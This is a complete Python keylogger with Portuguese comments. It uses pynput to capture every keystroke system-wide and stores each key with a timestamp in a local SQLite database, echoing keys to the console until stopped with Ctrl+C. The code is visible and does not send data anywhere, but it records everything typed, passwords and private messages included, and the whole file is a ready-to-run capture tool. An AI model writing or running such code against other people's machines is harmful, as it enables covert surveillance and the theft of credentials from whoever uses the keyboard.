#!/usr/bin/env python3
import sqlite3
from datetime import datetime
from pynput import keyboard

DB_PATH = "keystrokes.db"

def init_db(path=DB_PATH):
    """Cria tabela se não existir."""
    conn = sqlite3.connect(path)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_text TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

def format_key(key):
    """Formata a tecla para salvar (letra/numero ou nome da tecla especial)."""
    try:
        return key.char  # teclas alfanuméricas
    except AttributeError:
        name = str(key)  # ex: "Key.space"
        if name.startswith("Key."):
            return name.split(".", 1)[1].upper()
        return name

def on_press(key):
    """Callback chamado em thread separada pelo pynput."""
    try:
        key_text = format_key(key)
        ts = datetime.now().isoformat(sep=' ', timespec='seconds')

        # Abre e fecha conexão dentro da thread para evitar erro de SQLite em threads
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO keystrokes (key_text, timestamp) VALUES (?, ?)",
                (key_text, ts)
            )
            conn.commit()

        print(f"{ts} -> {key_text}")

    except Exception as e:
        #Log simples de erro para não parar o listener por causa de um erro isolado
        print(f"Erro ao gravar tecla: {e}")

def main():
    init_db()
    print("Listener iniciado — capturando teclas indefinidamente. Pressione Ctrl+C para parar.")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()  # inicia em background

    try:
        # Mantém o programa rodando enquanto o listener captura teclas em background.
        # Podemos simplesmente aguardar indefinidamente.
        while True:
            # dormir um pouco para não consumir CPU (ajuste se quiser)
            # não fazemos nada aqui, o trabalho é feito no callback
            import time
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nRecebido Ctrl+C — finalizando listener...")
        listener.stop()
        listener.join()
        print("Encerrado com sucesso.")

if __name__ == "__main__":
    main()

